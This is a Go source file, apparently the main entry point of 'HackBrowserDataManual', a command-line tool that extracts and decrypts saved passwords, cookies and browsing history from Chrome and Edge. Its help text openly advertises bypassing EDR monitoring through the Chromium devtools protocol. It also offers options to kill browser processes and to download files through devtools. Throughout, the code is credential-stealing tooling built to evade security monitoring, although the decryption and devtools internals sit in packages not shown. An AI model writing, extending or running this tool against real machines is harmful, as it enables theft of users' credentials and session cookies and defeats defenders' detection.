package main

import (
	"HackBrowserDataManual/browser"
	"HackBrowserDataManual/data"
	"HackBrowserDataManual/item"
	"errors"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"os"
	"path/filepath"
)

var rootCmd *cobra.Command

func init() {
	var targetBrowser string
	var masterKeyFile string
	var inputFileName string
	var outputFileName string
	var outputFormat string
	var userDir string
	var logLevel string
	var kill bool

	binaryName := filepath.Base(os.Args[0])
	rootCmd = &cobra.Command{
		Use: binaryName,
		Short: `extract password/history/cookie.
bypass edr monitor of browser data file by using Chromium devtools protocol`,
		CompletionOptions: cobra.CompletionOptions{
			DisableDefaultCmd: true,
		},
		PersistentPreRun: func(cmd *cobra.Command, args []string) {
			switch logLevel {
			case "info":
				log.SetLevel(log.InfoLevel)
			case "error":
				log.SetLevel(log.ErrorLevel)
			default:
				log.SetLevel(log.InfoLevel)
			}
		},
	}
	rootFlags := rootCmd.PersistentFlags()
	rootFlags.StringVarP(&targetBrowser, "browser", "b", item.Chrome, "browser(chrome/edge)")
	rootFlags.StringVarP(&logLevel, "log", "l", "info", "log level(info, error)")

	runCmd := &cobra.Command{
		Use:   "run",
		Short: "Parse all browser cookie, password and history",
		RunE: func(cmd *cobra.Command, args []string) error {
			for _, b := range []string{item.Chrome, item.Edge} {
				for _, t := range []string{item.Cookie, item.Password, item.History} {
					err := runE(b, t, masterKeyFile, "", "", outputFormat, kill)
					if err != nil {
						log.Infof("get %s for %s failed: ", t, b)
					}
				}

			}
			return nil
		},
	}

	runPersistentFlags := runCmd.PersistentFlags()
	runPersistentFlags.StringVarP(&outputFormat, "format", "f", item.CSV, "Output format(csv/json)")

	runFlags := runCmd.Flags()
	runFlags.BoolVar(&kill, "kill", false, "kill existing browser process")

	passwordCmd := &cobra.Command{
		Use:   "password",
		Short: "Parse browser Password file",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runE(targetBrowser, item.Password, masterKeyFile, inputFileName, outputFileName, outputFormat, kill)
		},
	}

	passwordFlags := passwordCmd.Flags()
	passwordFlags.StringVarP(&masterKeyFile, "key", "k", "", "browser master key file")
	passwordFlags.StringVarP(&inputFileName, "input", "i", "", "Password file")
	passwordFlags.StringVarP(&outputFileName, "output", "o", "", "Output file")

	cookieCmd := &cobra.Command{
		Use:   "cookie",
		Short: "Parse browser cookie file",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runE(targetBrowser, item.Cookie, masterKeyFile, inputFileName, outputFileName, outputFormat, kill)
		},
	}

	cookieFlags := cookieCmd.Flags()
	cookieFlags.StringVarP(&masterKeyFile, "key", "k", "", "browsr master key file")
	cookieFlags.StringVarP(&inputFileName, "input", "i", "", "Cookie file")
	cookieFlags.StringVarP(&outputFileName, "output", "o", "", "Output file")
	cookieFlags.BoolVar(&kill, "kill", false, "kill existing browser process")

	historyCmd := &cobra.Command{
		Use:   "history",
		Short: "Parse browser history file",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runE(targetBrowser, item.History, masterKeyFile, inputFileName, outputFileName, outputFormat, false)
		},
	}

	historyFlags := historyCmd.Flags()
	historyFlags.StringVarP(&inputFileName, "input", "i", "", "Password file")
	historyFlags.StringVarP(&outputFileName, "output", "o", "", "Output file")

	devToolCmd := &cobra.Command{
		Use:   "devtool",
		Short: "Using dev tool protocol to extract cookies.",
		RunE: func(cmd *cobra.Command, args []string) error {
			var browserInstance *browser.Browser
			switch targetBrowser {
			case item.Chrome:
				browserInstance = &browser.Browser{
					UserDir: userDir,
					Action:  item.Cookie,
					Util:    &browser.ChromeUtil{},
				}
			case item.Edge:
				browserInstance = &browser.Browser{
					UserDir: userDir,
					Action:  item.Cookie,
					Util:    &browser.EdgeUtil{},
				}
			default:
				log.Fatalf("invalid browser type %s", targetBrowser)
			}
			// check if there is browser process
			killed, err := browserInstance.CheckBrowser(kill)
			if err != nil {
				if errors.Is(err, &browser.ChromeExistError{}) {
					log.Infof("Chrome process exist, cookie may cannot be parsed")
				} else {
					return err
				}
			}
			if killed {
				defer browserInstance.RestoreBrowser()
			}
			cookies, err := browserInstance.ParseCookies()
			if err != nil {
				return err
			}
			cookieManager := &data.CookieManager{
				Manager: &data.Manager{
					OutputFormat:   outputFormat,
					OutputFileName: outputFileName,
					InnerData:      cookies,
				},
			}
			return cookieManager.WriteData(browserInstance)
		},
	}

	devToolFlags := devToolCmd.Flags()
	devToolFlags.StringVarP(&userDir, "userDir", "d", "", "user home dir")
	devToolFlags.BoolVar(&kill, "kill", false, "kill existing browser process")
	devToolFlags.StringVarP(&outputFileName, "output", "o", "", "Output file")

	downloadCmd := &cobra.Command{
		Use:   "download [file path]",
		Short: "download file via dev tool protocol",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			var browserInstance *browser.Browser
			switch targetBrowser {
			case item.Chrome:
				browserInstance = &browser.Browser{
					Util: &browser.ChromeUtil{},
				}
			case item.Edge:
				browserInstance = &browser.Browser{
					Util: &browser.EdgeUtil{},
				}
			default:
				log.Fatalf("invalid browser %s", targetBrowser)
			}
			downloadPath, err := browserInstance.Download(args[0])
			if err != nil {
				return err
			}
			log.Infof("download %s to %s", args[0], downloadPath)
			return nil
		},
	}

	rootCmd.AddCommand(runCmd)
	runCmd.AddCommand(passwordCmd)
	runCmd.AddCommand(cookieCmd)
	runCmd.AddCommand(historyCmd)
	rootCmd.AddCommand(devToolCmd)
	rootCmd.AddCommand(downloadCmd)
}

func runE(targetBrowser string, action string, masterKeyFile string, inputFileName string, outputFileName string, outputFormat string, kill bool) error {
	var browserInstance *browser.Browser
	switch targetBrowser {
	case item.Chrome:
		browserInstance = &browser.Browser{
			MasterKeyFile: masterKeyFile,
			InputFile:     inputFileName,
			Action:        action,
			Util:          &browser.ChromeUtil{},
		}
	case item.Edge:
		browserInstance = &browser.Browser{
			MasterKeyFile: masterKeyFile,
			InputFile:     inputFileName,
			Action:        action,
			Util:          &browser.EdgeUtil{},
		}
	default:
		log.Fatalf("invalid browser %s", targetBrowser)
	}
	if action == item.Cookie {
		// check if there is browser process
		killed, err := browserInstance.CheckBrowser(kill)
		if err != nil {
			if errors.Is(err, &browser.ChromeExistError{}) {
				log.Infof("Chrome process exist, cookie may cannot be parsed")
			} else {
				return err
			}
		}
		if killed {
			defer browserInstance.RestoreBrowser()
		}
	}
	browserInstance.InitPath()
	var masterKey []byte
	var err error
	if browserInstance.Action != item.History {
		masterKey, err = browserInstance.GetKey()
		if err != nil {
			return err
		}
	}
	tempInputFile, err := browserInstance.Download(browserInstance.InputFile)
	if err != nil {
		return err
	}
	defer os.Remove(tempInputFile)

	var dataManager data.IManager
	switch action {
	case item.Password:
		dataManager = &data.PasswordManager{
			Manager: &data.Manager{
				OutputFormat:   outputFormat,
				OutputFileName: outputFileName,
			},
		}
	case item.Cookie:
		dataManager = &data.CookieManager{
			Manager: &data.Manager{
				OutputFormat:   outputFormat,
				OutputFileName: outputFileName,
			},
		}
	case item.History:
		dataManager = &data.HistoryManager{
			Manager: &data.Manager{
				OutputFormat:   outputFormat,
				OutputFileName: outputFileName,
			},
		}
	}
	err = dataManager.Parse(masterKey, tempInputFile)
	if err != nil {
		return err
	}
	return dataManager.WriteData(browserInstance)
}

func main() {
	err := rootCmd.Execute()
	if err != nil {
		log.Error(err)
		os.Exit(0)
	}
}
